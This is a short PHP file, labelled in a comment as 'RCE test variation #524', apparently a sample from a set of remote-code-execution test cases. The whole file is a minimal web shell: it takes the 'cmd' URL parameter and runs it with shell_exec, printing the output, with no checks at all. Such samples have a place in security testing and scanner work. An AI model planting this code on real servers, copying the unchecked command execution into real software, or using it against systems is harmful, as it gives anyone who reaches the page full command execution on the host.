<?php
// RCE test variation #524
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>